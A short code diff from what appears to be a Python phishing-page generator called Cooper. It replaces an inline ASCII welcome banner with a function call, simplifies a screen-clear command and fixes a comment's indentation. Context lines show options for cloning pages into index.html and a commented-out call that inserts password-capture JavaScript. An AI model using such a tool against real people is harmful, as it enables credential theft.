@@ -34,34 +34,11 @@ OUTPUT = "index.html"
 # Does the user want images to be encoded/embedded? True or False
 EMBED = menu.embed
 
-try:
-    os.system('cls')
-except Exception:
-    os.system('clear')
+os.system('cls' if os.name == 'nt' else 'clear')
+
 time.sleep(1)
 
-print("Welcome to Cooper!")
-print ("""\
-
-      CCC
-     C
-     C    ooo ooo ppp  eee rrr
-     C    o o o o p  p e e r
-      CCC ooo ooo ppp  ee r
-                  p
-                  p          _
-                             |
-    o   o                  ^ |
-                  /^^^^^7  L_/
-    '  '     ,oO))))))))Oo,
-           ,'))))))))))))))), /{
-      '  ,'o  ))))))))))))))))={
-         >    ))))))))))))))))={
-         `,   ))))))\ \)))))))={
-           ',))))))))\/)))))' \{
-             '*O))))))))O*'
-
-""")
+banners.printArt()
 
 # Process script options
 if menu.gate or menu.email or menu.exit or menu.encode or menu.collect:
@@ -104,7 +81,7 @@ if menu.gate or menu.email or menu.exit or menu.encode or menu.collect:
 		else:
 			print("[!] No URL provided, so images will not be processed.")
 		# Insert this URL last to avoid fixImageURL() & replaceURL() replacing the JS link
-        # Uncomment the line below if you have set a URL for the JavaScript file
+		# Uncomment the line below if you have set a URL for the JavaScript file
 		#phishgate.insertPwdEval(OUTPUT)
 
 	#If exit template is selected
